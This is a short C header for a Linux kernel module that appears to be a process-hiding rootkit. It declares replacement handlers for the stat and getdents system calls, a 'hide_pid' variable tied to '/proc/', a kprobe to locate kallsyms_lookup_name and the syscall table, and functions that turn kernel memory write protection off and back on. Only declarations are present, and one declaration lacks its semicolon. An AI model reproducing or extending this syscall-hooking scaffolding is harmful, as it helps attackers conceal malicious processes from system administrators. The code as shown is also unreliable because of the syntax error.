#ifndef FUNCTIONS_H
#define FUNCTIONS_H


#define MAX_PATH 128
#define MAX_SEN 64

struct linux_dirent {
	unsigned long  d_ino;     // Inode number 
    unsigned long  d_off;     // Offset to next linux_dirent 
    unsigned short d_reclen;  // Length of this linux_dirent 
    char           d_name[];  // Filename (null-terminated) 
};


const char pre_path[MAX_SEN] ="/proc/"; 
char *hide_pid; //procces number (ID)
char full_path[MAX_PATH];

void buffer_path_pid(void);

static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };

//original stat and getdents
asmlinkage int (*old_stat)(const struct pt_regs *regs);
asmlinkage int (*old_getdents)(const struct pt_regs *regs);

//new handler of stat and getdents
asmlinkage int new_stat(const struct pt_regs *regs);
asmlinkage int new_getdents(const struct pt_regs *regs)
unsigned long *syscall_table = NULL; //syscall_table address

//remove and put back protected mode
int unprotect_memory(unsigned long addr); //read and write
int protect_memory(unsigned long addr); //read only

#endif //FUNCTIONS_H
